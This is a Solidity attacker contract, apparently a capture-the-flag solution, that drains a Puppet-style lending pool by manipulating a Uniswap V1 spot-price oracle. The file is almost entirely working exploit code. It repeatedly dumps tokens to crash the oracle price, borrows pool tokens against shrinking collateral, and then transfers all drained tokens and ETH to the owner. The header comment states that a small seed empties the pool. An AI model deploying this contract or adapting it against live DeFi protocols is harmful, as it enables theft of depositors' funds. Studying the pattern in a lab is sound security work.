// SPDX-License-Identifier: MIT
// PUPPET DRAIN (spot-oracle manipulation class).
// Technique: dump tokens to crater the ETH-per-token spot oracle, borrow what
// the tiny collateral now affords, dump the freshly borrowed tokens to crash
// the oracle further, repeat — each round is cheaper than the last. A ~1 ETH
// seed drains the entire pool.
pragma solidity ^0.8.0;

import {IPuppetPool} from "../interfaces/IPuppetPool.sol";
import {ERC20Mintable} from "../tokens/ERC20Mintable.sol";
import {IUniswapV1Exchange} from "../uniswap/UniswapV1.sol";

contract PuppetAttacker {
    IPuppetPool public immutable pool;
    IUniswapV1Exchange public immutable pair;
    ERC20Mintable public immutable token;
    address public immutable owner;

    uint256 internal constant MAX_ROUNDS = 16;

    constructor(address _pool, address _pair) {
        pool = IPuppetPool(_pool);
        pair = IUniswapV1Exchange(_pair);
        token = ERC20Mintable(pool.token());
        owner = msg.sender;
    }

    function attack() external {
        for (uint256 round = 0; round < MAX_ROUNDS; round++) {
            uint256 poolTokens = token.balanceOf(address(pool));
            if (poolTokens == 0) {
                break;
            }

            // 1. Dump everything we hold to crash the oracle.
            uint256 held = token.balanceOf(address(this));
            if (held > 0) {
                token.approve(address(pair), type(uint256).max);
                pair.tokenToEthSwapInput(held, 1, block.timestamp + 1);
            }

            // 2. Borrow the most the remaining ETH can collateralize.
            uint256 price = pool.computeOraclePrice(); // ETH per token, wei
            uint256 depositPerToken = pool.borrowingFactor() * price;
            uint256 affordable = address(this).balance * 1e18 / depositPerToken;
            uint256 borrowAmount = affordable < poolTokens ? affordable : poolTokens;
            if (borrowAmount == 0) {
                break;
            }

            // Excess collateral is refunded by the pool.
            pool.borrow{value: address(this).balance}(borrowAmount);
        }

        // 3. Hand everything to the owner.
        token.transfer(owner, token.balanceOf(address(this)));
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
